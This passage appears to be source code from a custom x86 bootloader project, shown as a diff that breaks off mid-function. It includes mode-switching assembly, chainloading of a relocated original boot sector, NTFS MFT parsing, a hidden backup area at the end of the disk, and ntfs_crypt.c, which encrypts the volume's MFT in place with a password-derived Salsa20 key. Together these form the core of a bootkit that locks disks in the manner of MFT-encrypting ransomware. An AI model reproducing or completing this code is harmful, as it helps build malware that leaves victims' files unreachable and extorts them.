+DATA_SEL equ 0x10
+
+STACK_TOP equ 0x70000
+
+%define SAVED_ESP_ADDR 0x1000
+
+_start:
+    cli
+
+    mov [boot_drive_store], dl
+
+    xor ax, ax
+    mov ds, ax
+    mov es, ax
+    mov ss, ax
+
+    mov sp, 0x7000
+
+    ; Enable A20
+    in al, 0x92
+    or al, 00000010b
+    and al, 11111110b
+    out 0x92, al
+
+    ; Load GDT
+    lgdt [gdt_descriptor]
+
+    ; Enter PM
+    mov eax, cr0
+    or eax, 1
+    mov cr0, eax
+
+    jmp CODE_SEL:protected_mode_entry
+
+; Real-Mode print function
+print_string:
+    pusha
+
+.loop:
+    lodsb
+    test al, al
+    jz .done
+
+    mov ah, 0x0E
+    mov bh, 0
+
+    int 0x10
+
+    jmp .loop
+
+.done:
+    popa
+    ret
+
+; GDT
+gdt_start:
+
+gdt_null:
+    dq 0
+
+gdt_code:
+    dw 0xFFFF
+    dw 0x0000
+    db 0
+    db 10011010b
+    db 11001111b
+    db 0
+
+gdt_data:
+    dw 0xFFFF
+    dw 0x0000
+    db 0
+    db 10010010b
+    db 11001111b
+    db 0
+
+gdt_end:
+
+gdt_descriptor:
+    dw gdt_end - gdt_start - 1
+    dd gdt_start
+
+; 16-bit GDT
+gdt16_start:
+
+gdt16_null:
+    dq 0
+
+gdt16_code:
+    dw 0xFFFF
+    dw 0x0000
+    db 0
+    db 10011010b
+    db 00001111b
+    db 0
+
+gdt16_data:
+    dw 0xFFFF
+    dw 0x0000
+    db 0
+    db 10010010b
+    db 00001111b
+    db 0
+
+gdt16_end:
+
+gdt16_descriptor:
+    dw gdt16_end - gdt16_start - 1
+    dd gdt16_start
+
+boot_drive_store db 0
+
+; Protected-Mode
+[BITS 32]
+
+protected_mode_entry:
+
+    mov ax, DATA_SEL
+
+    mov ds, ax
+    mov es, ax
+    mov fs, ax
+    mov gs, ax
+    mov ss, ax
+
+    mov esp, STACK_TOP
+
+    ; Clear BSS
+    mov edi, __bss_start
+
+    mov ecx, __bss_end
+    sub ecx, edi
+
+    xor eax, eax
+
+    shr ecx, 2
+
+    rep stosd
+
+    movzx eax, byte [boot_drive_store]
+
+    push eax
+
+    call bootloader_main
+
+.dead:
+    cli
+    hlt
+    jmp .dead
+
+; Reboot
+do_reboot:
+    cli
+
+.wait:
+    in al, 0x64
+    test al, 0x02
+    jnz .wait
+
+    mov al, 0xFE
+    out 0x64, al
+
+.hang:
+    hlt
+    jmp .hang
+
+; Chainloading
+do_chainload:
+    cli
+
+    ; use A20
+    in al, 0x92
+    or al, 00000010b
+    out 0x92, al
+
+    ; rebooting for chainloading
+    mov al, 0xFE
+    out 0x64, al
+
+.hang:
+    hlt
+    jmp .hang
+
+[BITS 16]
+
+pm16_chain:
+
+    mov ax, 0x10
+
+    mov ds, ax
+    mov es, ax
+    mov fs, ax
+    mov gs, ax
+    mov ss, ax
+
+    mov eax, cr0
+    and eax, 0xFFFFFFFE
+    mov cr0, eax
+
+    jmp 0x0000:rm_chain
+
+rm_chain:
+
+    xor ax, ax
+
+    mov ds, ax
+    mov es, ax
+    mov fs, ax
+    mov gs, ax
+    mov ss, ax
+
+    mov sp, 0x7000
+
+    ; Read original bootloader
+    mov bx, 0x7A00
+
+    mov ah, 0x02
+    mov al, 1
+
+    mov ch, 0
+    mov cl, 63
+    mov dh, 0
+
+    mov dl, [boot_drive_store]
+
+    int 0x13
+
+    jc $
+
+    mov dl, [boot_drive_store]
+
+    jmp 0x0000:0x7A00
+
+; INT13 Trampoline
+[BITS 32]
+
+rm_call_int13:
+
+    mov [SAVED_ESP_ADDR], esp
+
+    cli
+
+    lgdt [gdt16_descriptor]
+
+    jmp 0x08:pm16_int13
+
+[BITS 16]
+
+pm16_int13:
+
+    mov ax, 0x10
+
+    mov ds, ax
+    mov es, ax
+    mov ss, ax
+
+    mov eax, cr0
+    and eax, 0xFFFFFFFE
+    mov cr0, eax
+
+    jmp 0x0000:rm_int13
+
+rm_int13:
+
+    xor ax, ax
+
+    mov ds, ax
+    mov es, ax
+    mov fs, ax
+    mov gs, ax
+    mov ss, ax
+
+    mov sp, 0x7000
+
+    mov si, 0x7E10
+
+    mov ah, [0x7E00]
+    mov dl, [0x7E01]
+
+    int 0x13
+
+    setc al
+
+    mov [0x7E02], al
+    mov [0x7E03], ah
+
+    cli
+
+    lgdt [gdt_descriptor]
+
+    mov eax, cr0
+    or eax, 1
+    mov cr0, eax
+
+    jmp CODE_SEL:back32
+
+[BITS 32]
+
+back32:
+
+    mov ax, DATA_SEL
+
+    mov ds, ax
+    mov es, ax
+    mov fs, ax
+    mov gs, ax
+    mov ss, ax
+
+    mov esp, [SAVED_ESP_ADDR]
+
+    ret
+```
+
+`bootloader/hidden_store.c`:
+
+```c
+// hidden_store.c
+
+#include "hidden_store.h"
+#include "ata.h"
+#include "types.h"
+#include "bootloader.h"
+
+static uint8_t sector_buffer[512];
+static uint8_t mft_buffer[512];
+static uint64_t disk_end_lba = 0;
+
+static uint32_t header_lba(void)
+{
+    return (uint32_t)(disk_end_lba - 2);
+}
+
+static uint32_t vbr_backup_lba(void)
+{
+    return (uint32_t)(disk_end_lba - 3);
+}
+
+static uint32_t mft_backup_start_lba(void)
+{
+    return (uint32_t)(disk_end_lba - 3 - MFT_BACKUP_SECTORS);
+}
+
+static uint32_t get_mft_lba(uint32_t partition_lba)
+{
+    vga_puts("get_mft_lba: reading VBR at LBA ");
+    vga_put_dec(partition_lba);
+    vga_putchar('\n');
+
+    if (ata_read(partition_lba, 1, sector_buffer) != 0)
+    {
+        vga_puts("get_mft_lba: VBR read failed!\n");
+        return 0;
+    }
+
+    // Check NTFS signature at offset 3
+    vga_puts("OEM: ");
+    for (int i = 3; i < 11; i++)
+        vga_putchar(sector_buffer[i]);
+    vga_putchar('\n');
+
+    if (sector_buffer[3] != 'N' || sector_buffer[4] != 'T' ||
+        sector_buffer[5] != 'F' || sector_buffer[6] != 'S')
+    {
+        vga_puts("get_mft_lba: Not NTFS at this LBA!\n");
+        vga_puts("First 16 bytes: ");
+        for (int i = 0; i < 16; i++)
+        {
+            vga_put_hex(sector_buffer[i]);
+            vga_putchar(' ');
+        }
+        vga_putchar('\n');
+        return 0;
+    }
+
+    uint8_t spc = sector_buffer[13];
+    vga_puts("sectors_per_cluster: ");
+    vga_put_dec(spc);
+    vga_putchar('\n');
+
+    uint64_t mft_cluster = 0;
+    for (int i = 0; i < 8; i++)
+        mft_cluster |= (uint64_t)sector_buffer[i + 48] << (i * 8);
+
+    vga_puts("mft_cluster: ");
+    vga_put_hex((uint32_t)mft_cluster);
+    vga_putchar('\n');
+
+    uint32_t mft_lba = (uint32_t)(partition_lba + mft_cluster * spc);
+    vga_puts("mft_lba: ");
+    vga_put_dec(mft_lba);
+    vga_putchar('\n');
+
+    return mft_lba;
+}
+
+int hidden_store_init(uint64_t disk_sectors)
+{
+    disk_end_lba = disk_sectors - 1;
+    return 0;
+}
+
+int hidden_backup_mft(uint32_t partition_lba)
+{
+    vga_puts("Backing up MFT to hidden area...\n");
+
+    uint32_t mft_lba = get_mft_lba(partition_lba);
+    if (mft_lba == 0)
+    {
+        vga_puts("Cannot find MFT!\n");
+        return -1;
+    }
+
+    vga_puts("MFT at LBA: ");
+    vga_put_dec(mft_lba);
+    vga_putchar('\n');
+
+    vga_puts("Backup LBA: ");
+    vga_put_dec(mft_backup_start_lba());
+    vga_putchar('\n');
+
+    // Backup MFT sectors
+    for (uint32_t i = 0; i < MFT_BACKUP_SECTORS; i++)
+    {
+        if (ata_read(mft_lba + i, 1, mft_buffer) != 0)
+        {
+            vga_puts("MFT read error at sector ");
+            vga_put_dec(i);
+            vga_putchar('\n');
+
+            return -1;
+        }
+
+        if (ata_write(mft_backup_start_lba() + i, 1, mft_buffer) != 0)
+        {
+            vga_puts("Hidden write eror at sector: ");
+            vga_put_dec(i);
+            vga_putchar('\n');
+
+            return -1;
+        }
+    }
+
+    // Backup VBR
+    if (ata_read(partition_lba, 1, sector_buffer) != 0)
+        return -1;
+
+    if (ata_write(vbr_backup_lba(), 1, sector_buffer) != 0)
+        return -1;
+
+    HiddenHeader hdr = { 0 };
+    hdr.magic = HIDDEN_MAGIC;
+    hdr.partition_lba = partition_lba;
+    hdr.mft_lba = mft_lba;
+    hdr.mft_sector_count = MFT_BACKUP_SECTORS;
+    hdr.disk_total_sectors = disk_end_lba + 1;
+
+    static uint8_t hdr_sector[512] = { 0 };
+    for (uint32_t i = 0; i < sizeof(HiddenHeader); i++)
+        hdr_sector[i] = ((uint8_t *)&hdr)[i];
+
+    if (ata_write(header_lba(), 1, hdr_sector) != 0)
+        return -1;
+
+    vga_puts("MFT backup successfully.\n");
+
+    return 0;
+}
+
+int hidden_restore_mft(uint32_t partition_lba)
+{
+    vga_puts("Restoring MFT from hidden area...\n");
+
+    HiddenHeader hdr;
+    if (hidden_read_header(&hdr) != 0)
+    {
+        vga_puts("Cannot read hidden header!\n");
+        return -1;
+    }
+
+    vga_puts("Restoring...\n");
+    vga_put_dec(hdr.mft_sector_count);
+    vga_puts("MFT sectors to LBA ");
+    vga_put_dec(hdr.mft_lba);
+    vga_putchar('\n');
+
+    // Restore MFT sectors
+    for (uint32_t i = 0; i < hdr.mft_sector_count; i++)
+    {
+        if (ata_read(mft_backup_start_lba() + i, 1, mft_buffer) != 0)
+        {
+            vga_puts("Backup read error!\n");
+            return -1;
+        }
+
+        if (ata_write(hdr.mft_lba + i, 1, mft_buffer) != 0)
+        {
+            vga_puts("MFT write error!\n");
+            return -1;
+        }
+    }
+
+    // Restore VBR
+    if (ata_read(vbr_backup_lba(), 1, sector_buffer) != 0)
+        return -1;
+
+    if (ata_write(partition_lba, 1, sector_buffer) != 0)
+        return -1;
+
+    vga_puts("MFT was restored!\n");
+
+    return 0;
+}
+
+int hidden_wipe(void)
+{
+    vga_puts("Wiping hidden area...\n");
+
+    static uint8_t zero[512] = { 0 };
+
+    for (uint32_t i = 0; i < MFT_BACKUP_SECTORS; i++)
+        ata_write(mft_backup_start_lba() + i, 1, zero);
+
+    ata_write(vbr_backup_lba(), 1, zero);
+    ata_write(header_lba(), 1, zero);
+
+    vga_puts("Hidden area is wiped.\n");
+
+    return 0;
+}
+
+int hidden_read_header(HiddenHeader *hdr)
+{
+    static uint8_t state[512];
+    if (ata_read(60, 1, state) != 0)
+        return -1;
+
+    uint64_t total = 0;
+    for (int i = 0; i < 8; i++)
+        total |= (uint64_t)state[i + 8] << (i * 8);
+
+    if (total == 0)
+        return -1;
+
+    disk_end_lba = total - 1;
+
+    if (ata_read(header_lba(), 1, sector_buffer) != 0)
+        return -1;
+
+    HiddenHeader *header = (HiddenHeader *)sector_buffer;
+    if (header->magic != HIDDEN_MAGIC)
+        return -1;
+
+    *hdr = *header;
+
+    return 0;
+}
+```
+
+`bootloader/hidden_store.h`:
+
+```h
+// hidden_store.h
+
+#ifndef HIDDEN_STORE_H
+#define HIDDEN_STORE_H
+
+#include "types.h"
+
+#define MFT_BACKUP_SECTORS 24 // first 24 MFT stores
+#define HIDDEN_MAGIC 0x484F4C44UL // "HOLD"
+
+typedef struct {
+    uint32_t magic; // HIDDEN_MAGIC
+    uint32_t partition_lba;
+    uint32_t mft_lba;
+    uint32_t mft_sector_count;
+    uint64_t disk_total_sectors;
+    uint8_t reserved[484];
+} __attribute__((packed)) HiddenHeader;
+
+int hidden_store_init(uint64_t disk_sectors);
+int hidden_backup_mft(uint32_t partition_lba);
+int hidden_restore_mft(uint32_t partition_lba);
+int hidden_wipe(void);
+
+int hidden_read_header(HiddenHeader *hdr);
+
+#endif
+```
+
+`bootloader/io.h`:
+
+```h
+// io.h
+
+#ifndef IO_H
+#define IO_H
+
+#include "types.h"
+
+static inline void outb(uint16_t port, uint8_t val)
+{
+    __asm__ volatile (
+        "outb %0, %1" :: "a"(val), "Nd"(port)
+    );
+}
+
+static inline uint8_t inb(uint16_t port)
+{
+    uint8_t val;
+    __asm__ volatile ("inb %1, %0" : "=a"(val) : "Nd"(port));
+    
+    return val;
+}
+
+static inline uint16_t inw(uint16_t port)
+{
+    uint16_t val;
+    __asm__ volatile ("inw %1, %0" : "=a"(val) : "Nd"(port));
+
+    return val;
+}
+
+static inline void outw(uint16_t port, uint16_t val)
+{
+    __asm__ volatile ("outw %0, %1" :: "a"(val), "Nd"(port));
+}
+
+#endif
+```
+
+`bootloader/kdf.c`:
+
+```c
+// kdf.c
+
+#include "kdf.h"
+#include "salsa20.h"
+
+void kdf_derive(uint8_t key[32], const char *password, const uint8_t salt[16], uint32_t iterations)
+{
+    uint8_t state[64] = { 0 };  // full 64 bytes to avoid OOB read/write
+
+    int i = 0;
+    while (*password && i < 32)
+    {
+        state[i % 32] ^= (uint8_t)*password++;
+        i++;
+    }
+
+    for (int j = 0; j < 16; j++)
+        state[j] ^= salt[j];
+
+    Salsa20_Ctx ctx;
+    uint8_t nonce[8] = { 0 };
+
+    for (uint32_t iter = 0; iter < iterations; iter++)
+    {
+        salsa20_init(&ctx, state, nonce, iter);
+        salsa20_encrypt(&ctx, state, state, 64);  // full 64 bytes, no OOB
+
+        state[0] ^= (uint8_t)iter;
+        state[1] ^= (uint8_t)(iter >> 8);
+        state[2] ^= (uint8_t)(iter >> 16);
+        state[3] ^= (uint8_t)(iter >> 24);
+    }
+
+    for (int j = 0; j < 32; j++)
+        key[j] = state[j];
+}
+```
+
+`bootloader/kdf.h`:
+
+```h
+// kdf.h
+
+#ifndef KDF_H
+#define KDF_H
+
+#include "types.h"
+
+void kdf_derive(uint8_t key[32], const char *password, const uint8_t salt[16], uint32_t iterations);
+
+#endif
+```
+
+`bootloader/keyboard.c`:
+
+```c
+// keyboard.c
+
+#include "keyboard.h"
+#include "io.h"
+
+static int shift_pressed = 0;
+static int caps_lock = 0;
+
+static const char scancode_table[] = {
+    0,    0,   '1', '2', '3', '4', '5', '6',        // 0x00~0x07
+    '7', '8', '9', '0', '-', '=',  '\b', '\t',      // 0x08~0x0F
+    'q', 'w', 'e', 'r', 't', 'y', 'u', 'i',         // 0x10~0x17
+    'o', 'p', '[', ']', '\n',  0,  'a', 's',        // 0x18~0x1F
+    'd', 'f', 'g', 'h', 'j', 'k', 'l', ';',         // 0x20~0x27
+    '\'', '`',  0,  '\\', 'z', 'x', 'c', 'v',       // 0x28~0x2F
+    'b', 'n', 'm', ',', '.', '/',   0,  '*',        // 0x30~0x37
+     0,  ' ',                                       // 0x38~0x39
+};
+
+static const char scancode_shift_table[] = {
+    0,    0,   '!', '@', '#', '$', '%', '^',
+    '&', '*', '(', ')', '_', '+', '\b', '\t',
+    'Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I',
+    'O', 'P', '{', '}', '\n',  0,  'A', 'S',
+    'D', 'F', 'G', 'H', 'J', 'K', 'L', ':',
+    '"', '~',   0,  '|', 'Z', 'X', 'C', 'V',
+    'B', 'N', 'M', '<', '>', '?',   0,  '*',
+     0,  ' ',
+};
+
+static uint8_t read_scancode(void)
+{
+    while (!keyboard_hashkey());
+
+    return inb(KEYBOARD_DATA_PORT);
+}
+
+int keyboard_hashkey(void)
+{
+    return inb(KEYBOARD_STATUS_PORT) & 0x01;
+}
+
+char keyboard_getchar(void)
+{
+    while (1)
+    {
+        uint8_t sc = read_scancode();
+
+        if (sc & 0x80)
+        {
+            uint8_t released = sc & 0x7F;
+            if (released == 0x2A || released == 0x36)
+                shift_pressed = 0;
+
+            continue;
+        }
+
+        if (sc == 0x2A || sc == 0x36)
+        {
+            shift_pressed = 1;
+            continue;
+        }
+
+        if (sc == 0x3A)
+        {
+            caps_lock = !caps_lock;
+            continue;
+        }
+
+        if (sc >= sizeof(scancode_table))
+            continue;
+
+        char c;
+        if (shift_pressed)
+            c = scancode_shift_table[sc];
+        else
+            c = scancode_table[sc];
+
+        if (c == 0)
+            continue;
+
+        // Caps Lock only affects letters
+        if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z'))
+        {
+            if (caps_lock ^ shift_pressed)
+            {
+                if (c >= 'a' && c <= 'z')
+                    c -= 32;
+            }
+            else
+            {
+                if (c >= 'A' && c <= 'Z')
+                    c += 32;
+            }
+        }
+
+        return c;
+    }
+}
+
+void keyboard_readline(char *buffer, int max)
+{
+    int i = 0;
+    while (i < max - 1)
+    {
+        char c = keyboard_getchar();
+
+        if (c == '\n')
+        {
+            vga_putchar('\n');
+            break;
+        }
+
+        if (c == '\b')
+        {
+            if (i > 0)
+            {
+                i--;
+                vga_putchar('\b');
+            }
+
+            continue;
+        }
+
+        buffer[i++] = c;
+        vga_putchar(c);
+    }
+
+    buffer[i] = '\0';
+}
+
+void keyboard_flush(void)
+{
+    for (volatile uint32_t i = 0; i < 20000000; i++);
+
+    while (inb(KEYBOARD_STATUS_PORT) & 0x01)
+        inb(KEYBOARD_DATA_PORT);
+}
+```
+
+`bootloader/keyboard.h`:
+
+```h
+// keyboard.h
+
+#ifndef KEYBOARD_H
+#define KEYBOARD_H
+
+#include "bootloader.h"
+
+#define KEYBOARD_DATA_PORT 0x60
+#define KEYBOARD_STATUS_PORT 0x64
+
+void keyboard_int(void);
+char keyboard_getchar(void);
+void keyboard_readline(char *buffer, int max);
+int keyboard_hashkey(void);
+void keyboard_flush(void);
+
+#endif
+```
+
+`bootloader/linker.ld`:
+
+```ld
+ENTRY(_start)
+
+SECTIONS
+{
+    . = 0x8000;
+
+    .text :
+    {
+        *(.text*)
+    }
+
+    .rodata :
+    {
+        *(.rodata*)
+    }
+
+    .data :
+    {
+        *(.data*)
+    }
+
+    .bss :
+    {
+        __bss_start = .;
+        *(.bss*)
+        *(COMMON)
+        __bss_end = .;
+    }
+}
+```
+
+`bootloader/ntfs.c`:
+
+```c
+// ntfs.c
+
+#include "ata.h"
+#include "ntfs.h"
+#include "bootloader.h"
+
+static uint8_t mft_buffer[1024];
+static uint8_t vbr_buffer[512];
+
+static void apply_fixup(uint8_t *entry, int size)
+{
+    MFT_Entry *hdr = (MFT_Entry *)entry;
+    uint16_t *update = (uint16_t *)(entry + hdr->update_seq_offset);
+    uint16_t seq = update[0];
+
+    int sectors = size / 512;
+
+    for (int i = 0; i < sectors; i++)
+    {
+        uint16_t *end = (uint16_t *)(entry + 510 + i * 512);
+        if (*end != seq)
+        {
+            vga_puts("Fixup mismatch at sector ");
+            vga_put_dec(i);
+            vga_putchar('\n');
+        }
+
+        *end = update[i+1];
+    }
+}
+
+static void print_utf16(uint16_t *s, int len)
+{
+    for (int i = 0; i < len; i++)
+    {
+        char c = (s[i] < 128) ? (char)s[i] : '?';
+        vga_putchar(c);
+    }
+}
+
+static void dump_mft_entry(uint32_t entry_num, uint32_t mft_lba, uint8_t sectors_per_record)
+{
+    uint32_t lba = mft_lba + entry_num * sectors_per_record;
+    if (ata_read(lba, sectors_per_record, mft_buffer) != 0)
+    {
+        vga_puts("\tATA read error\n");
+        return;
+    }
+
+    MFT_Entry *entry = (MFT_Entry *)mft_buffer;
+    
+    if (entry->signature[0] != 'F' || entry->signature[1] != 'I' || entry->signature[2] != 'L' || entry->signature[3] != 'E')
+    {
+        vga_puts("Not a valid FILE record -> skip!\n");
+        return;
+    }
+
+    apply_fixup(mft_buffer, sectors_per_record * 512);
+
+    vga_puts("Entry ");
+    vga_put_dec(entry_num);
+    vga_puts(": flags=");
+    vga_put_hex(entry->flags);
+
+    if (!(entry->flags & MFT_FLAGS_IN_USE))
+    {
+        vga_puts(" [deleted]\n");
+        return;
+    }
+
+    if (entry->flags & MFT_FLAGS_DIRECTORY)
+        vga_puts(" [DIR]");
+    else
+        vga_puts(" [FILE]");
+
+    uint8_t *ptr = mft_buffer + entry->attr_offset;
+    while (ptr < mft_buffer + entry->used_size)
+    {
+        Attr_Header *attr = (Attr_Header *)ptr;
+
+        if (attr->type == ATTR_END || attr->length == 0)
+            break;
+
+        if (attr->type == ATTR_FILE_NAME && !attr->non_resident)
+        {
+            Attr_Resident *res = (Attr_Resident *)(ptr + sizeof(Attr_Header));
+            Attr_FileName *fn = (Attr_FileName *)(ptr + res->value_offset);
+
+            if (fn->namespace == 1 || fn->namespace == 3)
+            {
+                vga_puts("name=");
+                print_utf16(fn->name, fn->name_length);
+                vga_puts("size=");
+                vga_put_dec((uint32_t)fn->real_size);
+            }
+
+            (void)res;
+        }
+
+        ptr += attr->length;
+    }
+
+    vga_putchar('\n');
+}
+
+void ntfs_read_mft(uint32_t partition_lba)
+{
+    vga_puts("NTFS MFT Read\n\n");
+
+    vga_puts("Reading VBR at LBA ");
+    vga_put_dec(partition_lba);
+    vga_puts("...\n");
+
+    if (ata_read(partition_lba, 1, vbr_buffer) != 0)
+    {
+        vga_puts("Failed to read VBR!\n");
+        return;
+    }
+
+    NTFS_VBR *vbr = (NTFS_VBR *)vbr_buffer;
+
+    if (vbr->oem_id[0] != 'N' || vbr->oem_id[1] != 'T' || vbr->oem_id[2] != 'F' || vbr->oem_id[3] != 'S')
+    {
+        vga_puts("Invalid NTFS partition!.");
+        vga_putchar('\n');
+        for (int i = 0; i < 16; i++)
+        {
+            vga_put_hex(vbr_buffer[i]);
+            vga_putchar(' ');
+        }
+        vga_putchar('\n');
+        return;
+    }
+
+    vga_puts("OEM: ");
+    for (int i = 0; i < 8; i++)
+        vga_putchar(vbr->oem_id[i]);
+
+    vga_putchar('\n');
+
+    vga_puts("Bytes/sector: ");
+    vga_put_dec(vbr->bytes_per_sector);
+    vga_putchar('\n');
+
+    vga_puts("Sectors/cluster: ");
+    vga_put_dec(vbr->sectors_per_cluster);
+    vga_putchar('\n');
+
+    vga_puts("MFT cluster: ");
+    vga_put_hex((uint32_t)vbr->mft_cluster);
+    vga_putchar('\n');
+
+    uint32_t mft_lba = partition_lba + (uint32_t)(vbr->mft_cluster * vbr->sectors_per_cluster);
+
+    vga_puts("MFT LBA: ");
+    vga_put_hex(mft_lba);
+    vga_putchar('\n');
+
+    uint32_t bytes_per_record;
+    if (vbr->clusters_per_mft_record < 0)
+    {
+        bytes_per_record = 1u << (uint8_t)(-vbr->clusters_per_mft_record);
+    }
+    else
+    {
+        bytes_per_record = (uint32_t)vbr->clusters_per_mft_record * vbr->sectors_per_cluster * vbr->bytes_per_sector;
+    }
+
+    uint8_t sectors_per_record = bytes_per_record / 512;
+
+    vga_puts("Bytes/record: ");
+    vga_put_dec(bytes_per_record);
+    vga_putchar('\n');
+
+    vga_puts("Entries:\n");
+    const char *system_names[] =
+    {
+        "$MFT",
+        "$MFTMirr",
+        "$LogFile",
+        "$Volume",
+        "$AttrDef",
+        ".",
+        "$Bitmap",
+        "$Boot",
+        "$BadClus",
+        "$Secure",
+        "$UpCase",
+        "$Extend",
+    };
+
+    for (int i = 0; i < sizeof(system_names)/sizeof(*system_names); i++)
+    {
+        vga_puts(system_names[i]);
+        vga_puts("->");
+        dump_mft_entry(i, mft_lba, sectors_per_record);
+    }
+
+    vga_putchar('\n');
+
+    vga_puts("User's files\n");
+    for (int i = 12; i < 32; i++)
+    {
+        dump_mft_entry(i, mft_lba, sectors_per_record);
+    }
+
+    vga_puts("\nAction successfully.\n");
+}
+```
+
+`bootloader/ntfs.h`:
+
+```h
+// ntfs.h
+
+#ifndef NTFS_H
+#define NTFS_H
+
+#include "types.h"
+
+#define ATTR_STANDARD_INFO  0x10
+#define ATTR_FILE_NAME      0x30
+#define ATTR_DATA           0x80
+#define ATTR_END            0xFFFFFFFF
+
+#define MFT_FLAGS_IN_USE    0x01
+#define MFT_FLAGS_DIRECTORY 0x02
+
+// VBR (Volume Boot Record), the first sector of NTFS partition
+typedef struct __attribute__((packed))
+{
+    uint8_t jump[3];
+    uint8_t oem_id[8];
+
+    uint16_t bytes_per_sector;
+    uint8_t sectors_per_cluster;
+
+    uint16_t reserved_sectors;
+    uint8_t zeros1[3];
+
+    uint16_t unused1;
+    uint8_t media_descriptor;
+    uint16_t zeros2;
+
+    uint16_t sectors_per_track;
+    uint16_t heads;
+    uint32_t hidden_sectors;
+    uint32_t unused2;
+    uint32_t unused3;
+
+    uint64_t total_sectors;
+    uint64_t mft_cluster;
+    uint64_t mft_mirror_cluster;
+
+    int8_t clusters_per_mft_record;
+    uint8_t reserved0[3];
+
+    int8_t clusters_per_index_record;
+    uint8_t reserved1[3];
+
+    uint64_t volume_serial;
+    uint32_t checksum;
+
+} NTFS_VBR;
+
+// MFT Entry header
+typedef struct {
+    uint8_t signature[4];
+    uint16_t update_seq_offset;
+    uint16_t update_seq_count;
+    uint64_t log_seq_number;
+    uint16_t sequence_number;
+    uint16_t hard_link_count;
+    uint16_t attr_offset;
+    uint16_t flags;
+    uint32_t used_size;
+    uint32_t allocated_size;
+    uint64_t base_record;
+    uint16_t next_attr_id;
+    uint8_t reserved[2];
+    uint32_t record_number;
+} __attribute__((packed)) MFT_Entry;
+
+// Attribute header
+typedef struct {
+    uint32_t type;
+    uint32_t length;
+    uint8_t non_resident;
+    uint8_t name_length;
+    uint16_t name_offset;
+    uint16_t flags;
+    uint16_t attr_id;
+} __attribute__((packed)) Attr_Header;
+
+typedef struct {
+    uint32_t value_length;
+    uint16_t value_offset;
+    uint16_t flags;
+} __attribute__((packed)) Attr_Resident;
+
+typedef struct {
+    uint64_t parent_ref;
+    uint64_t created_time;
+    uint64_t modified_time;
+    uint64_t mft_modified_time;
+    uint64_t accessed_time;
+    uint64_t allocated_size;
+    uint64_t real_size;
+    uint32_t flags;
+    uint32_t reparse_value;
+    uint8_t name_length;
+    uint8_t namespace;
+    uint16_t name[1];
+} __attribute__((packed)) Attr_FileName;
+
+void ntfs_read_mft(uint32_t partition_lba);
+
+#endif
+```
+
+`bootloader/ntfs_crypt.c`:
+
+```c
+// ntfs_crypt.c
+
+#include "ntfs_crypt.h"
+#include "ata.h"
+#include "kdf.h"
+#include "salsa20.h"
+#include "bootloader.h"
+
+static uint32_t prng_state = 0;
+
+static void prng_seed(void)
+{
+    uint32_t val = 0;
+    __asm__ volatile (
+        "xor %%eax, %%eax\n"
+        "in %%dx, %%al\n"
+        : "=a"(val) : "d"(0x70)
+    );
+    prng_state = val ^ 0xDEADBEEF;
+}
+
+static uint32_t prng_next(void)
+{
+    // xor and shift
+    prng_state ^= prng_state << 13;
+    prng_state ^= prng_state >> 17;
+    prng_state ^= prng_state << 5;
+    
+    return prng_state;
+}
+
+static int read_salt(uint8_t salt[SALT_SIZE])
+{
+    static uint8_t sector[512];
+    if (ata_read(SALT_SECTOR, 1, sector) != 0)
+        return -1;
+
+    // Check magic at bytes 0–3
+    if (sector[0] != 0x53 || sector[1] != 0x41 ||
+        sector[2] != 0x4C || sector[3] != 0x54)
+    {
+        vga_puts("Salt sector: invalid magic!\n");
+        return -1;
+    }
+
+    // Read salt from bytes 4 onward
+    for (int i = 0; i < SALT_SIZE; i++)
+        salt[i] = sector[4 + i];
+
+    return 0;
+}
+
+static int get_mft_lba(uint32_t partition_lba, uint32_t *mft_lba_out)
+{
+    static uint8_t vbr[512];
+    if (ata_read(partition_lba, 1, vbr) != 0)
+        return -1;
+
+    // check NTFS signature
+    if (vbr[3] != 'N' || vbr[4] != 'T' || vbr[5] != 'F' || vbr[6] != 'S')
+    {
+        vga_puts("Not NTFS!\n");
+        return -1;
+    }
+
+    uint8_t sectors_per_cluster = vbr[13];
+    uint64_t mft_cluster = 0;
+    for (int i = 0; i < 8; i++)
+        mft_cluster |= (uint64_t)vbr[48 + i] << (i * 8);
+
+    *mft_lba_out = (uint32_t)(partition_lba + mft_cluster * sectors_per_cluster);
+
+    return 0;
+}
+
+static int ntfs_mft_crypt(const char *password, uint32_t partition_lba, int encryption)
+{
+    uint8_t salt[SALT_SIZE];
+    if (read_salt(salt) != 0)
+        return -1;
+
+    vga_puts(encryption ? "Deriving key for encryption..." : "Deriving key for decryption...");
+    vga_putchar('\n');
+
+    // derive key from password + salt
+    uint8_t key[32];
+    kdf_derive(key, password, salt, KDF_ITERATIONS);
+
+    // find MFT location
+    uint32_t mft_lba;
+    if (get_mft_lba(partition_lba, &mft_lba) != 0)
+    {
+        vga_puts("Failed to retrieve MFT!\n");
+        return -1;
+    }
+
+    vga_puts("MFT at LBA: ");
+    vga_put_hex(mft_lba);
+    vga_putchar('\n');
+
+    static uint8_t sector_buffer[512];
+    static uint8_t out_buffer[512];
+
+    vga_puts(encryption ? "Encrypting..." : "Decrypting...");
+    vga_puts("MFT [");
+
+    for (uint32_t i = 0; i < MFT_ENCRYPT_SECTORS; i++)
+    {
+        // read MFT and check error
+        if (ata_read(mft_lba + i, 1, sector_buffer) != 0)
+        {
+            vga_puts("\nRead error at sector ");
+            vga_put_hex(mft_lba + i);
+            vga_putchar('\n');
+
+            return -1;
+        }
+
+        uint8_t nonce[8] = { 0 };
+        nonce[0] = (uint8_t)i;
+        nonce[1] = (uint8_t)(i >> 8);
+        nonce[2] = (uint8_t)(i >> 16);
+        nonce[3] = (uint8_t)(i >> 24);
+
+        Salsa20_Ctx ctx;
+        salsa20_init(&ctx, key, nonce, 0);
+        salsa20_encrypt(&ctx, sector_buffer, out_buffer, 512);
+
+        if (ata_write(mft_lba + i, 1, out_buffer) != 0)
+        {
+            vga_puts("\nWrite error at sector ");
+            vga_put_dec(mft_lba + i);
+            vga_putchar('\n');
+
+            return -1;
+        }
+
+        if (i % 16 == 0)
+            vga_putchar('#');
+    }
+
+    vga_puts("]\nDone.\n");
+
+    for (int i = 0; i < 32; i++)
+        key[i] = 0;
+
+    return 0;
+}
+
+int ntfs_generate_salt(void)
+{
+    static uint8_t sector[512] = { 0 };
+
+    // Magic marker FIRST at bytes 0–3
+    sector[0] = 0x53;  // 'S'
+    sector[1] = 0x41;  // 'A'
+    sector[2] = 0x4C;  // 'L'
+    sector[3] = 0x54;  // 'T'
+
+    prng_seed();
+
+    // Salt at bytes 4 onward
